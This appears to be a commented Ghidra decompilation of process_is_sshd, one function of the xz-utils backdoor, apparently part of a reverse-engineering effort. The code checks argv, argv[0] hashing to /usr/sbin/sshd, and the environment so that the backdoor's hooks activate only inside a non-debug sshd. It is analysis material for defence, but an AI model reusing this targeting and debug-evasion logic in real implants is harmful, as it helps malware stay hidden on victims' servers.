// /home/kali/xzre-ghidra/xzregh/103A20_process_is_sshd.c
// Function: process_is_sshd @ 0x103A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_is_sshd(elf_info_t * elf, u8 * stack_end)


/*
 * AutoDoc: Walks the argc/argv/envp layout straight off the caller’s stack pointer and only returns TRUE when the process really looks like sshd. It demands a sane argc, an argv[0] pointer that lives on the stack and hashes to `/usr/sbin/sshd`, and then walks argv[1…] ensuring every pointer stays within 0x4000 bytes of the saved SP and never triggers `check_argument`’s debug filter. Once argv terminates, envp entries must either remain stack-resident or fall inside sshd’s writable `.data/.bss` span, and any environment string that maps to a known encoded ID aborts the probe.
 */

#include "xzre_types.h"

BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)

{
  long argc;
  u8 *argv_entry;
  EncodedStringId EVar3;
  char *debug_match;
  u8 *data_segment_base;
  long arg_index;
  ulong *env_cursor;
  BOOL more_args_to_scan;
  u64 data_segment_bounds[2];
  
  if (((((&stack0xfffffffffffffff8 < stack_end) &&
        ((ulong)((long)stack_end - (long)&stack0xfffffffffffffff8) < 0x2001)) &&
       (argc = *(long *)stack_end, argc - 1U < 0x20)) &&
      ((argv_entry = *(u8 **)(stack_end + 8), stack_end < argv_entry && (argv_entry != (u8 *)0x0)))) &&
     ((ulong)((long)argv_entry - (long)stack_end) < 0x4001)) {
    // AutoDoc: Hash argv[0] and insist it decodes to `/usr/sbin/sshd` before scanning any further.
    EVar3 = get_string_id((char *)argv_entry,(char *)0x0);
    arg_index = 1;
    if (EVar3 == STR_usr_sbin_sshd) {
      // AutoDoc: Iterate over argv[1..argc-1], checking each pointer range before handing it to the debug filter.
      while (more_args_to_scan = arg_index != argc, arg_index = arg_index + 1, more_args_to_scan) {
        argv_entry = *(u8 **)(stack_end + arg_index * 8);
        if (argv_entry <= stack_end) {
          return FALSE;
        }
        if (argv_entry == (u8 *)0x0) {
          return FALSE;
        }
        if (0x4000 < (ulong)((long)argv_entry - (long)stack_end)) {
          return FALSE;
        }
        // AutoDoc: Let the helper spot strings containing lowercase `d` so sshd’s debug modes never reach the hooks.
        debug_match = check_argument((char)*(undefined2 *)argv_entry,(char *)argv_entry);
        if (debug_match != (char *)0x0) {
          return FALSE;
        }
      }
      // AutoDoc: Switch to envp processing only after confirming argv was NULL-terminated.
      if (*(long *)(stack_end + arg_index * 8) == 0) {
        env_cursor = (ulong *)(stack_end + arg_index * 8 + 8);
        do {
          argv_entry = (u8 *)*env_cursor;
          if (argv_entry == (u8 *)0x0) {
            return FALSE;
          }
          // AutoDoc: Stack-relative argv/env pointers must land within 0x4000 bytes of the saved SP; anything else falls through to the `.data` guard.
          if ((argv_entry <= stack_end) || (0x4000 < (ulong)((long)argv_entry - (long)stack_end))) {
            data_segment_bounds[0] = 0;
            // AutoDoc: When env pointers leave the stack, demand that they reside inside sshd’s writable `.data/.bss` range.
            data_segment_base = (u8 *)elf_get_data_segment(elf,data_segment_bounds,TRUE);
            if (data_segment_base == (u8 *)0x0) {
              return FALSE;
            }
            if (data_segment_base + data_segment_bounds[0] < argv_entry + 0x2c) {
              return FALSE;
            }
            if (argv_entry < data_segment_base) {
              return FALSE;
            }
          }
          // AutoDoc: Known environment keys (non-zero encoded IDs) are treated as hostile and abort the probe immediately.
          EVar3 = get_string_id((char *)*env_cursor,(char *)0x0);
          if (EVar3 != 0) {
            return FALSE;
          }
          env_cursor = env_cursor + 1;
        } while (*env_cursor != 0);
        return TRUE;
      }
    }
  }
  return FALSE;
}

